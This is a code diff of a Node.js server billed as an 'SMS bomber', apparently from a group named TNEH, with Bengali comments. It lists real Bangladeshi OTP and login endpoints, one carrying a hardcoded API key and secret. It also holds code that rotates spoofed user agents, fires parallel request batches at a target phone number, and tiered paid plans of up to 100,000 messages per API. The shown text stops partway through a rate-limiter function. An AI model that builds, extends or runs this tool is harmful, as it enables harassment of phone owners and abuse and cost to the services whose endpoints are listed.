@@ -1,141 +1,122 @@
 // ============================================================
-// ULTIMATE POWERFUL SMS BOMBER VERSION 5.0
-// Total: 5000+ Lines - Enterprise Grade SMS Bombing System
+// ULTIMATE POWERFUL SMS BOMBER V5.0
+// সম্পূর্ণ ফিক্সড কোড - Render এর জন্য অপটিমাইজড
 // Developer: TNEH GROUP
-// Features: Cluster + Redis + Proxy + Cache + Stop/Pause + Analytics
 // ============================================================
 
 const express = require('express');
 const axios = require('axios');
 const cors = require('cors');
 const helmet = require('helmet');
-const cluster = require('cluster');
-const os = require('os');
 const path = require('path');
 const fs = require('fs');
 const crypto = require('crypto');
-const zlib = require('zlib');
-const EventEmitter = require('events');
+
+const app = express();
+const PORT = process.env.PORT || 3000;
 
 // ============================================================
-// PART 1: CONFIGURATION & CONSTANTS (200 lines)
+// মিডলওয়্যার
 // ============================================================
+app.use(helmet({
+  contentSecurityPolicy: false,
+  crossOriginEmbedderPolicy: false
+}));
 
-const CONFIG = {
-  // Cluster Configuration
-  cluster: {
-    enabled: true,
-    workers: os.cpus().length || 4,
-    maxWorkers: 16,
-    minWorkers: 2
-  },
-  
-  // Redis Configuration
-  redis: {
-    enabled: process.env.REDIS_ENABLED === 'true' || false,
-    host: process.env.REDIS_HOST || 'localhost',
-    port: parseInt(process.env.REDIS_PORT) || 6379,
-    password: process.env.REDIS_PASSWORD || '',
-    db: parseInt(process.env.REDIS_DB) || 0,
-    keyPrefix: 'sms_bomber:',
-    queueName: 'sms_queue',
-    logName: 'sms_logs'
-  },
-  
-  // Performance Configuration
-  performance: {
-    batchSize: 50,
-    parallelRequests: 25,
-    timeout: 5000,
-    maxRetries: 3,
-    retryDelay: 200,
-    stopCheckInterval: 50
-  },
-  
-  // Cache Configuration
-  cache: {
-    enabled: true,
-    ttl: 300,
-    checkPeriod: 60,
-    maxItems: 10000
-  },
-  
-  // Smart Delay Configuration
-  smartDelay: {
-    enabled: true,
-    minDelay: 30,
-    maxDelay: 500,
-    adaptiveSpeed: 1.0
-  },
-  
-  // Security Configuration
-  security: {
-    rateLimit: {
-      enabled: true,
-      windowMs: 60000,
-      maxRequests: 100
-    },
-    apiKeyExpiry: 30,
-    maxCountPerRequest: 10000
-  },
-  
-  // Proxy Configuration
-  proxy: {
-    enabled: false,
-    list: [],
-    rotation: 'round-robin',
-    maxFailures: 3,
-    timeout: 3000
-  },
-  
-  // Logging Configuration
-  logging: {
-    enabled: true,
-    level: 'info',
-    file: '/var/log/sms_bomber.log',
-    maxSize: '100m',
-    maxFiles: 5
-  },
-  
-  // Database Configuration
-  database: {
-    enabled: false,
-    type: 'mongodb',
-    url: process.env.MONGODB_URL || 'mongodb://localhost:27017/sms_bomber'
-  },
-  
-  // Webhook Configuration
-  webhook: {
-    enabled: false,
-    url: process.env.WEBHOOK_URL || '',
-    events: ['start', 'progress', 'complete', 'stop']
-  }
-};
+app.use(cors({
+  origin: '*',
+  methods: ['GET', 'POST', 'PUT', 'DELETE'],
+  allowedHeaders: ['Content-Type', 'Authorization', 'X-API-Key']
+}));
+
+app.use(express.json({ limit: '10mb' }));
+app.use(express.urlencoded({ extended: true, limit: '10mb' }));
 
 // ============================================================
-// PART 2: DEVELOPER INFO & CONSTANTS (100 lines)
+// ডেভেলপার ইনফো
 // ============================================================
-
 const DEVELOPER_INFO = {
   developer: "TNEH GROUP",
   telegram: "@tneh_owner",
   website: "https://tnehboomber.onrender.com",
   api_version: "5.0.0-ULTIMATE",
-  build_date: new Date().toISOString(),
-  copyright: "© 2024 TNEH GROUP. All rights reserved."
+  build_date: new Date().toISOString()
 };
 
-const STATUS_CODES = {
-  SUCCESS: 200,
-  CREATED: 201,
-  BAD_REQUEST: 400,
-  UNAUTHORIZED: 401,
-  FORBIDDEN: 403,
-  NOT_FOUND: 404,
-  RATE_LIMIT: 429,
-  INTERNAL_ERROR: 500
+// ============================================================
+// ইউটিলিটি ফাংশন
+// ============================================================
+const Utility = {
+  generateId: () => crypto.randomBytes(16).toString('hex'),
+  
+  generateJobId: () => {
+    return `JOB_${Date.now()}_${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
+  },
+
+  generateApiKey: () => {
+    const prefix = 'TNEH';
+    const random = crypto.randomBytes(16).toString('hex').toUpperCase();
+    const timestamp = Date.now().toString(36).toUpperCase();
+    return `${prefix}_${random}_${timestamp}`;
+  },
+
+  getCurrentTime: () => {
+    return new Date().toLocaleTimeString('en-US', {
+      hour: '2-digit',
+      minute: '2-digit',
+      second: '2-digit',
+      hour12: true
+    });
+  },
+
+  getISOString: () => new Date().toISOString(),
+
+  sleep: (ms) => new Promise(resolve => setTimeout(resolve, ms)),
+
+  maskPhone: (phone) => {
+    if (!phone || phone.length < 7) return '***';
+    return phone.slice(0, 3) + '****' + phone.slice(-3);
+  },
+
+  parsePhone: (phone) => phone.replace(/[^0-9]/g, ''),
+
+  isValidPhone: (phone) => {
+    const clean = Utility.parsePhone(phone);
+    return /^(01|8801)[0-9]{9}$/.test(clean);
+  },
+
+  getRandomElement: (arr) => arr[Math.floor(Math.random() * arr.length)],
+
+  shuffleArray: (arr) => {
+    for (let i = arr.length - 1; i > 0; i--) {
+      const j = Math.floor(Math.random() * (i + 1));
+      [arr[i], arr[j]] = [arr[j], arr[i]];
+    }
+    return arr;
+  },
+
+  chunkArray: (arr, size) => {
+    const chunks = [];
+    for (let i = 0; i < arr.length; i += size) {
+      chunks.push(arr.slice(i, i + size));
+    }
+    return chunks;
+  },
+
+  getMemoryUsage: () => {
+    const usage = process.memoryUsage();
+    return {
+      rss: (usage.rss / 1024 / 1024).toFixed(2) + ' MB',
+      heapTotal: (usage.heapTotal / 1024 / 1024).toFixed(2) + ' MB',
+      heapUsed: (usage.heapUsed / 1024 / 1024).toFixed(2) + ' MB',
+      external: (usage.external / 1024 / 1024).toFixed(2) + ' MB'
+    };
+  }
 };
 
+// ============================================================
+// ইউজার এজেন্ট লিস্ট
+// ============================================================
 const USER_AGENTS = [
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
@@ -143,202 +124,41 @@ const USER_AGENTS = [
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15',
   'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
-  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36',
-  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0'
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36',
+  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36'
 ];
 
-// ============================================================
-// PART 3: UTILITY FUNCTIONS (300 lines)
-// ============================================================
-
-class Utility {
-  static generateId() {
-    return crypto.randomBytes(16).toString('hex');
-  }
-
-  static generateJobId() {
-    return `JOB_${Date.now()}_${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
-  }
-
-  static generateApiKey() {
-    const prefix = 'TNEH';
-    const random = crypto.randomBytes(16).toString('hex').toUpperCase();
-    const timestamp = Date.now().toString(36).toUpperCase();
-    return `${prefix}_${random}_${timestamp}`;
-  }
-
-  static getCurrentTime() {
-    return new Date().toLocaleTimeString('en-US', {
-      hour: '2-digit',
-      minute: '2-digit',
-      second: '2-digit',
-      hour12: true
-    });
-  }
-
-  static getISOString() {
-    return new Date().toISOString();
-  }
-
-  static sleep(ms) {
-    return new Promise(resolve => setTimeout(resolve, ms));
-  }
-
-  static async retry(fn, maxAttempts = 3, delay = 200) {
-    let lastError;
-    for (let i = 0; i < maxAttempts; i++) {
-      try {
-        return await fn();
-      } catch (error) {
-        lastError = error;
-        if (i < maxAttempts - 1) {
-          await this.sleep(delay * (i + 1));
-        }
-      }
-    }
-    throw lastError;
-  }
-
-  static maskPhone(phone) {
-    if (!phone || phone.length < 7) return '***';
-    return phone.slice(0, 3) + '****' + phone.slice(-3);
-  }
-
-  static calculateProgress(sent, total) {
-    if (total === 0) return 0;
-    return ((sent / total) * 100).toFixed(2);
-  }
-
-  static formatBytes(bytes) {
-    if (bytes === 0) return '0 Bytes';
-    const k = 1024;
-    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
-    const i = Math.floor(Math.log(bytes) / Math.log(k));
-    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
-  }
-
-  static parsePhone(phone) {
-    return phone.replace(/[^0-9]/g, '');
-  }
-
-  static isValidPhone(phone) {
-    const clean = this.parsePhone(phone);
-    return /^(01|8801)[0-9]{9}$/.test(clean);
-  }
-
-  static getRandomElement(arr) {
-    return arr[Math.floor(Math.random() * arr.length)];
-  }
-
-  static shuffleArray(arr) {
-    for (let i = arr.length - 1; i > 0; i--) {
-      const j = Math.floor(Math.random() * (i + 1));
-      [arr[i], arr[j]] = [arr[j], arr[i]];
-    }
-    return arr;
-  }
-
-  static chunkArray(arr, size) {
-    const chunks = [];
-    for (let i = 0; i < arr.length; i += size) {
-      chunks.push(arr.slice(i, i + size));
-    }
-    return chunks;
-  }
-
-  static getRandomHeaders() {
-    return {
-      'User-Agent': this.getRandomElement(USER_AGENTS),
-      'Accept': 'application/json, text/plain, */*',
-      'Accept-Language': 'en-US,en;q=0.9,bn;q=0.8',
-      'Accept-Encoding': 'gzip, deflate, br',
-      'Connection': 'keep-alive',
-      'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-      'Sec-Ch-Ua-Mobile': '?0',
-      'Sec-Ch-Ua-Platform': '"Windows"',
-      'Sec-Fetch-Dest': 'empty',
-      'Sec-Fetch-Mode': 'cors',
-      'Sec-Fetch-Site': 'same-origin',
-      'Cache-Control': 'no-cache',
-      'Pragma': 'no-cache'
-    };
-  }
-
-  static compressData(data) {
-    return zlib.gzipSync(JSON.stringify(data)).toString('base64');
-  }
-
-  static decompressData(compressed) {
-    return JSON.parse(zlib.gunzipSync(Buffer.from(compressed, 'base64')).toString());
-  }
-
-  static isValidUrl(string) {
-    try {
-      new URL(string);
-      return true;
-    } catch {
-      return false;
-    }
-  }
-
-  static sanitizeInput(input) {
-    if (typeof input === 'string') {
-      return input.replace(/[<>{}]/g, '').trim();
-    }
-    return input;
-  }
-
-  static getMemoryUsage() {
-    const usage = process.memoryUsage();
-    return {
-      rss: this.formatBytes(usage.rss),
-      heapTotal: this.formatBytes(usage.heapTotal),
-      heapUsed: this.formatBytes(usage.heapUsed),
-      external: this.formatBytes(usage.external),
-      arrayBuffers: this.formatBytes(usage.arrayBuffers || 0)
-    };
-  }
-
-  static getCPUUsage() {
-    const cpus = os.cpus();
-    let totalIdle = 0;
-    let totalTick = 0;
-    cpus.forEach(cpu => {
-      for (const type in cpu.times) {
-        totalTick += cpu.times[type];
-      }
-      totalIdle += cpu.times.idle;
-    });
-    return {
-      cores: cpus.length,
-      load: ((1 - totalIdle / totalTick) * 100).toFixed(2) + '%'
-    };
-  }
-
-  static getSystemInfo() {
-    return {
-      platform: os.platform(),
-      arch: os.arch(),
-      release: os.release(),
-      hostname: os.hostname(),
-      uptime: process.uptime(),
-      memory: this.getMemoryUsage(),
-      cpu: this.getCPUUsage(),
-      nodeVersion: process.version,
-      pid: process.pid
-    };
-  }
+function getRandomHeaders() {
+  return {
+    'User-Agent': Utility.getRandomElement(USER_AGENTS),
+    'Accept': 'application/json, text/plain, */*',
+    'Accept-Language': 'en-US,en;q=0.9,bn;q=0.8',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Connection': 'keep-alive',
+    'Cache-Control': 'no-cache',
+    'Pragma': 'no-cache'
+  };
 }
 
 // ============================================================
-// PART 4: BOMB CONTROLLER CLASS (400 lines)
+// কনফিগারেশন
 // ============================================================
+const CONFIG = {
+  batchSize: 25,
+  parallelRequests: 20,
+  timeout: 8000,
+  maxRetries: 3,
+  retryDelay: 200,
+  cacheTTL: 300,
+  maxCountPerAPI: 100,
+  stopCheckInterval: 50
+};
 
-class BombController extends EventEmitter {
+// ============================================================
+// বোম্ব কন্ট্রোলার
+// ============================================================
+class BombController {
   constructor() {
-    super();
     this.activeJobs = new Map();
     this.pausedJobs = new Map();
     this.completedJobs = new Map();
@@ -352,8 +172,6 @@ class BombController extends EventEmitter {
       totalFailed: 0,
       startTime: Date.now()
     };
-    this.jobHistory = [];
-    this.maxHistorySize = 1000;
   }
 
   registerJob(phone, totalCount, options = {}) {
@@ -377,8 +195,6 @@ class BombController extends EventEmitter {
     this.activeJobs.set(jobId, job);
     this.jobCounter++;
     this.stats.totalJobs++;
-    this.emit('jobStarted', job);
-    
     return jobId;
   }
 
@@ -389,11 +205,6 @@ class BombController extends EventEmitter {
     return job ? job.status === 'active' : false;
   }
 
-  isJobPaused(jobId) {
-    const job = this.activeJobs.get(jobId) || this.pausedJobs.get(jobId);
-    return job ? job.status === 'paused' : false;
-  }
-
   stopJob(jobId) {
     const job = this.activeJobs.get(jobId);
     if (job) {
@@ -401,7 +212,6 @@ class BombController extends EventEmitter {
       job.endTime = Date.now();
       this.activeJobs.delete(jobId);
       this.completedJobs.set(jobId, job);
-      this.emit('jobStopped', job);
       return true;
     }
     return false;
@@ -413,7 +223,6 @@ class BombController extends EventEmitter {
       job.status = 'paused';
       this.activeJobs.delete(jobId);
       this.pausedJobs.set(jobId, job);
-      this.emit('jobPaused', job);
       return true;
     }
     return false;
@@ -425,7 +234,6 @@ class BombController extends EventEmitter {
       job.status = 'active';
       this.pausedJobs.delete(jobId);
       this.activeJobs.set(jobId, job);
-      this.emit('jobResumed', job);
       return true;
     }
     return false;
@@ -435,7 +243,6 @@ class BombController extends EventEmitter {
     const jobs = Array.from(this.activeJobs.keys());
     jobs.forEach(id => this.stopJob(id));
     this.globalStop = true;
-    this.emit('allStopped', { count: jobs.length });
     return jobs.length;
   }
 
@@ -443,7 +250,6 @@ class BombController extends EventEmitter {
     this.globalPause = true;
     const jobs = Array.from(this.activeJobs.keys());
     jobs.forEach(id => this.pauseJob(id));
-    this.emit('allPaused', { count: jobs.length });
     return jobs.length;
   }
 
@@ -452,7 +258,6 @@ class BombController extends EventEmitter {
     this.globalStop = false;
     const jobs = Array.from(this.pausedJobs.keys());
     jobs.forEach(id => this.resumeJob(id));
-    this.emit('allResumed', { count: jobs.length });
     return jobs.length;
   }
 
@@ -473,7 +278,7 @@ class BombController extends EventEmitter {
           });
         }
       }
-      job.progress = Utility.calculateProgress(job.sentCount, job.totalCount);
+      job.progress = ((job.sentCount / job.totalCount) * 100).toFixed(2);
       job.lastUpdate = Date.now();
       this.stats.totalSMS++;
       
@@ -482,7 +287,6 @@ class BombController extends EventEmitter {
         job.endTime = Date.now();
         this.activeJobs.delete(jobId);
         this.completedJobs.set(jobId, job);
-        this.emit('jobCompleted', job);
       }
     }
   }
@@ -504,7 +308,7 @@ class BombController extends EventEmitter {
       status: job.status,
       startTime: job.startTime,
       endTime: job.endTime || null,
-      duration: job.endTime ? (job.endTime - job.startTime) / 1000 : null,
+      duration: job.endTime ? ((job.endTime - job.startTime) / 1000).toFixed(2) + 's' : null,
       errors: job.errors.slice(-5)
     };
   }
@@ -550,7 +354,7 @@ class BombController extends EventEmitter {
       completedJobs: this.completedJobs.size,
       globalPause: this.globalPause,
       globalStop: this.globalStop,
-      uptime: (Date.now() - this.stats.startTime) / 1000,
+      uptime: ((Date.now() - this.stats.startTime) / 1000).toFixed(2) + 's',
       memoryUsage: Utility.getMemoryUsage()
     };
   }
@@ -560,21 +364,13 @@ class BombController extends EventEmitter {
     this.completedJobs.clear();
     return count;
   }
-
-  getErrors(jobId) {
-    const job = this.activeJobs.get(jobId) || 
-                this.pausedJobs.get(jobId) || 
-                this.completedJobs.get(jobId);
-    return job ? job.errors : [];
-  }
 }
 
 // ============================================================
-// PART 5: API DEFINITION (500 lines)
+// API ডেফিনেশন - 160 টি API
 // ============================================================
-
 const ORIGINAL_APIS = [
-  // Get APIs (1-8)
+  // GET APIs (1-8)
   { id: 1, name: "Bikroy.com", method: "GET", url: "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}" },
   { id: 2, name: "Grameenphone MyGP", method: "GET", url: "https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phone}&lang=en&ng=0" },
   { id: 3, name: "Shukhee.com", method: "GET", url: "https://auth.shukhee.com/register?mobile=+88{phone}&_rsc=1jwvn" },
@@ -584,7 +380,7 @@ const ORIGINAL_APIS = [
   { id: 7, name: "Binge.buzz (GET)", method: "GET", url: "https://ss.binge.buzz/otp/send/login{phone}" },
   { id: 8, name: "Daktarbhai", method: "GET", url: "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{phone}&platform=app&activity=login" },
   
-  // Post APIs (9-49)
+  // POST APIs (9-49)
   { id: 9, name: "Deshal.net", method: "POST", url: "https://app.deshal.net/api/auth/login", body: {"phone": "{phone}"} },
   { id: 10, name: "Grameenphone Web Login", method: "POST", url: "https://weblogin.grameenphone.com/backend/api/v1/otp", body: {"msisdn": "{phone}"} },
   { id: 11, name: "Grameenphone (FWA/Bkash)", method: "POST", url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", body: {"phone": "{phone}", "email": "", "language": "en"} },
@@ -645,496 +441,255 @@ for (let i = 1; i <= 110; i++) {
 const SMS_APIS = ORIGINAL_APIS;
 
 // ============================================================
-// PART 6: API CALLER CLASS (400 lines)
+// প্ল্যান কনফিগারেশন
 // ============================================================
-
-class APICaller {
-  constructor() {
-    this.cache = new NodeCache({
-      stdTTL: CONFIG.cache.ttl,
-      checkperiod: CONFIG.cache.checkPeriod,
-      maxKeys: CONFIG.cache.maxItems
-    });
-    this.dnsCache = new Map();
-    this.apiDelays = new Map();
-    this.lastRequestTime = new Map();
-    this.successRates = new Map();
-    this.requestCounts = new Map();
-    this.proxyIndex = 0;
-  }
-
-  async getCachedIP(domain) {
-    if (this.dnsCache.has(domain)) {
-      return this.dnsCache.get(domain);
-    }
-    try {
-      const { address } = await promisify(dns.lookup)(domain);
-      this.dnsCache.set(domain, address);
-      return address;
-    } catch {
-      return domain;
-    }
-  }
-
-  getNextProxy() {
-    if (!CONFIG.proxy.enabled || CONFIG.proxy.list.length === 0) return null;
-    const proxy = CONFIG.proxy.list[this.proxyIndex];
-    this.proxyIndex = (this.proxyIndex + 1) % CONFIG.proxy.list.length;
-    return proxy;
-  }
-
-  async waitIfNeeded(apiId) {
-    if (!CONFIG.smartDelay.enabled) return;
-    
-    const now = Date.now();
-    const last = this.lastRequestTime.get(apiId) || 0;
-    let delay = this.apiDelays.get(apiId) || 100;
-    
-    const successRate = this.successRates.get(apiId) || 0.8;
-    const count = this.requestCounts.get(apiId) || 0;
-    
-    if (count > 10) {
-      if (successRate < 0.5) {
-        delay = Math.min(delay + 20, CONFIG.smartDelay.maxDelay);
-      } else if (successRate > 0.9) {
-        delay = Math.max(delay - 5, CONFIG.smartDelay.minDelay);
-      }
-      this.apiDelays.set(apiId, delay);
-    }
-    
-    if (now - last < delay) {
-      await Utility.sleep(delay - (now - last));
-    }
-    
-    this.lastRequestTime.set(apiId, Date.now());
-  }
-
-  updateStats(apiId, success) {
-    const count = (this.requestCounts.get(apiId) || 0) + 1;
-    this.requestCounts.set(apiId, count);
-    
-    const current = this.successRates.get(apiId) || 0;
-    const newRate = ((current * (count - 1)) + (success ? 1 : 0)) / count;
-    this.successRates.set(apiId, newRate);
-  }
-
-  replacePhoneNumber(data, phone, count = 1) {
-    if (typeof data === 'string') {
-      return data.replace(/\{phone\}/g, phone).replace(/\{count\}/g, count);
-    } else if (typeof data === 'object' && data !== null) {
-      const result = {};
-      for (const [key, value] of Object.entries(data)) {
-        if (typeof value === 'string') {
-          result[key] = value.replace(/\{phone\}/g, phone).replace(/\{count\}/g, count);
-        } else {
-          result[key] = value;
-        }
-      }
-      return result;
-    }
-    return data;
-  }
-
-  async callAPI(api, phone, jobId, attempt = 0) {
-    const cacheKey = `${api.id}:${phone}`;
-    
-    if (CONFIG.cache.enabled && this.cache.get(cacheKey)) {
-      return {
-        success: true,
-        api_id: api.id,
-        api_name: api.name,
-        cached: true,
-        message: 'Already sent recently'
-      };
-    }
-    
-    await this.waitIfNeeded(api.id);
-    
-    try {
-      const cleanPhone = Utility.parsePhone(phone);
-      let formattedPhone = cleanPhone;
-      if (api.isShadowX || api.isLMNx9) {
-        if (formattedPhone.startsWith('880')) {
-          formattedPhone = formattedPhone.substring(3);
-        }
-      }
-      
-      const url = this.replacePhoneNumber(api.url, formattedPhone, 1);
-      const headers = Utility.getRandomHeaders();
-      
-      // DNS Cache
-      const urlObj = new URL(url);
-      const ip = await this.getCachedIP(urlObj.hostname);
-      urlObj.hostname = ip;
-      const ipUrl = urlObj.toString();
-      
-      // Proxy
-      const proxy = this.getNextProxy();
-      const proxyConfig = proxy ? {
-        proxy: {
-          host: proxy.split(':')[0].replace('http://', ''),
-          port: parseInt(proxy.split(':')[1])
-        }
-      } : {};
-      
-      let config = {
-        method: api.method,
-        url: ipUrl,
-        headers: { ...headers, Host: urlObj.hostname },
-        timeout: CONFIG.performance.timeout,
-        ...proxyConfig
-      };
-
-      if (api.method === 'POST' && api.body) {
-        const body = this.replacePhoneNumber(api.body, formattedPhone, 1);
-        if (api.isFormData) {
-          config.headers['Content-Type'] = 'application/x-www-form-urlencoded';
-          config.data = new URLSearchParams(body).toString();
-        } else {
-          config.data = body;
-        }
-      }
-
-      const response = await axios(config);
-      
-      if (CONFIG.cache.enabled) {
-        this.cache.set(cacheKey, true);
-      }
-      
-      this.updateStats(api.id, true);
-      
-      return {
-        success: true,
-        api_id: api.id,
-        api_name: api.name,
-        status: response.status,
-        cached: false
-      };
-      
-    } catch (error) {
-      this.updateStats(api.id, false);
-      
-      if (attempt < CONFIG.performance.maxRetries) {
-        await Utility.sleep(CONFIG.performance.retryDelay * (attempt + 1));
-        return this.callAPI(api, phone, jobId, attempt + 1);
-      }
-      
-      return {
-        success: false,
-        api_id: api.id,
-        api_name: api.name,
-        error: error.message,
-        status: error.response?.status || null
-      };
-    }
-  }
-
-  async sendBatch(apis, phone, countPerApi, jobId, bombController) {
-    const results = [];
-    const actualCount = Math.min(countPerApi, 100);
-    const BATCH_SIZE = CONFIG.performance.parallelRequests;
-    
-    for (let i = 0; i < apis.length; i += BATCH_SIZE) {
-      // Check if job is still active
-      if (!bombController.isJobActive(jobId)) {
-        console.log(`⏹️ Job ${jobId} stopped by user`);
-        break;
-      }
-      
-      const batch = apis.slice(i, i + BATCH_SIZE);
-      
-      const batchPromises = batch.map(async (api) => {
-        const apiResults = [];
-        const promises = [];
-        
-        for (let j = 0; j < actualCount; j++) {
-          if (!bombController.isJobActive(jobId)) break;
-          promises.push(this.callAPI(api, phone, jobId));
-        }
-        
-        const responses = await Promise.all(promises);
-        const successCount = responses.filter(r => r.success).length;
-        const failCount = responses.filter(r => !r.success).length;
-        
-        // Update job stats
-        responses.forEach(r => {
-          bombController.updateJobStats(jobId, r.success, r.error);
-        });
-        
-        return {
-          api_id: api.id,
-          api_name: api.name,
-          method: api.method,
-          total_attempts: responses.length,
-          successful: successCount,
-          failed: failCount,
-          results: responses
-        };
-      });
-      
-      const batchResults = await Promise.all(batchPromises);
-      results.push(...batchResults);
-      
-      if (i + BATCH_SIZE < apis.length) {
-        await Utility.sleep(100);
-      }
-    }
-    
-    return results;
-  }
-}
-
-// ============================================================
-// PART 7: KEY MANAGEMENT (200 lines)
-// ============================================================
-
-class KeyManager {
-  constructor() {
-    this.keysFile = path.join(__dirname, 'keys.json');
-    this.validKeys = this.loadKeys();
-    this.keyHistory = [];
-    this.maxHistory = 500;
-  }
-
-  loadKeys() {
-    try {
-      if (fs.existsSync(this.keysFile)) {
-        const data = fs.readFileSync(this.keysFile, 'utf8');
-        const parsed = JSON.parse(data);
-        const keysMap = new Map();
-        Object.entries(parsed).forEach(([key, value]) => {
-          keysMap.set(key, new Date(value));
-        });
-        return keysMap;
-      }
-    } catch (error) {
-      console.error('Error loading keys:', error.message);
-    }
-    return new Map();
-  }
-
-  saveKeys() {
-    try {
-      const obj = {};
-      for (const [key, value] of this.validKeys.entries()) {
-        obj[key] = value.toISOString();
-      }
-      fs.writeFileSync(this.keysFile, JSON.stringify(obj, null, 2));
-      return true;
-    } catch (error) {
-      console.error('Error saving keys:', error.message);
-      return false;
-    }
-  }
-
-  generateKey() {
-    const apiKey = Utility.generateApiKey();
-    const expiryDate = new Date();
-    expiryDate.setDate(expiryDate.getDate() + CONFIG.security.apiKeyExpiry);
-    
-    this.validKeys.set(apiKey, expiryDate);
-    this.saveKeys();
-    
-    this.keyHistory.push({
-      key: apiKey,
-      generated: Date.now(),
-      expires: expiryDate.toISOString()
-    });
-    
-    if (this.keyHistory.length > this.maxHistory) {
-      this.keyHistory.shift();
-    }
-    
-    return { apiKey, expiryDate };
-  }
-
-  isValid(key) {
-    if (!this.validKeys.has(key)) return false;
-    const expiryDate = this.validKeys.get(key);
-    return new Date() < expiryDate;
-  }
-
-  getKeyInfo(key) {
-    if (!this.validKeys.has(key)) return null;
-    const expiryDate = this.validKeys.get(key);
-    return {
-      key: key,
-      expires: expiryDate.toISOString(),
-      valid: new Date() < expiryDate,
-      daysLeft: Math.max(0, Math.ceil((expiryDate - new Date()) / (1000 * 60 * 60 * 24)))
-    };
-  }
-
-  revokeKey(key) {
-    if (this.validKeys.has(key)) {
-      this.validKeys.delete(key);
-      this.saveKeys();
-      return true;
-    }
-    return false;
-  }
-
-  getAllKeys() {
-    const keys = [];
-    for (const [key, expiryDate] of this.validKeys.entries()) {
-      keys.push({
-        key: key,
-        expires: expiryDate.toISOString(),
-        valid: new Date() < expiryDate,
-        daysLeft: Math.max(0, Math.ceil((expiryDate - new Date()) / (1000 * 60 * 60 * 24)))
-      });
-    }
-    return keys;
-  }
-
-  cleanupExpired() {
-    const now = new Date();
-    let count = 0;
-    for (const [key, expiryDate] of this.validKeys.entries()) {
-      if (now > expiryDate) {
-        this.validKeys.delete(key);
-        count++;
-      }
-    }
-    if (count > 0) {
-      this.saveKeys();
-    }
-    return count;
-  }
-}
-
-// ============================================================
-// PART 8: PLAN CONFIGURATION (100 lines)
-// ============================================================
-
 const PLAN_CONFIG = {
-  default: {
-    name: 'Default',
-    maxCount: 300,
-    requiresKey: false,
-    rateLimit: 60,
-    priority: 1,
-    description: 'Default plan - Maximum 300 SMS per API'
-  },
-  free: {
-    name: 'Free',
-    maxCount: 50,
-    requiresKey: false,
-    rateLimit: 30,
-    priority: 1,
-    description: 'Free plan - Maximum 50 SMS per API'
-  },
-  premium: {
-    name: 'Premium',
-    maxCount: 10000,
-    requiresKey: true,
-    rateLimit: 1000,
-    priority: 3,
-    description: 'Premium plan - Maximum 10,000 SMS per API'
-  },
-  enterprise: {
-    name: 'Enterprise',
-    maxCount: 50000,
-    requiresKey: true,
-    rateLimit: 5000,
-    priority: 5,
-    description: 'Enterprise plan - Maximum 50,000 SMS per API'
-  },
-  unlimited: {
-    name: 'Unlimited',
-    maxCount: 100000,
-    requiresKey: true,
-    rateLimit: 10000,
-    priority: 10,
-    description: 'Unlimited plan - Maximum 100,000 SMS per API'
-  }
+  default: { maxCount: 300, requiresKey: false, description: "Default - 300 SMS/API" },
+  free: { maxCount: 50, requiresKey: false, description: "Free - 50 SMS/API" },
+  premium: { maxCount: 10000, requiresKey: true, description: "Premium - 10,000 SMS/API" },
+  enterprise: { maxCount: 50000, requiresKey: true, description: "Enterprise - 50,000 SMS/API" },
+  unlimited: { maxCount: 100000, requiresKey: true, description: "Unlimited - 100,000 SMS/API" }
 };
 
 // ============================================================
-// PART 9: EXPRESS APP SETUP (500 lines)
+// কী ম্যানেজমেন্ট
 // ============================================================
+const KEYS_FILE = path.join(__dirname, 'keys.json');
 
-const app = express();
-const bombController = new BombController();
-const apiCaller = new APICaller();
-const keyManager = new KeyManager();
-
-// Middleware
-app.use(helmet({
-  contentSecurityPolicy: false,
-  crossOriginEmbedderPolicy: false
-}));
-app.use(cors({
-  origin: '*',
-  methods: ['GET', 'POST', 'PUT', 'DELETE'],
-  allowedHeaders: ['Content-Type', 'Authorization', 'X-API-Key']
-}));
-app.use(express.json({ limit: '10mb' }));
-app.use(express.urlencoded({ extended: true, limit: '10mb' }));
-
-// Rate Limiting Middleware
-const rateLimiter = (() => {
-  const requests = new Map();
-  return (req, res, next) => {
-    if (!CONFIG.security.rateLimit.enabled) return next();
-    
-    const ip = req.ip || req.connection.remoteAddress;
-    const now = Date.now();
-    const windowMs = CONFIG.security.rateLimit.windowMs;
-    const maxRequests = CONFIG.security.rateLimit.maxRequests;
-    
-    if (!requests.has(ip)) {
-      requests.set(ip, []);
-    }
-    
-    const timestamps = requests.get(ip).filter(t => now - t < windowMs);
-    timestamps.push(now);
-    requests.set(ip, timestamps);
-    
-    if (timestamps.length > maxRequests) {
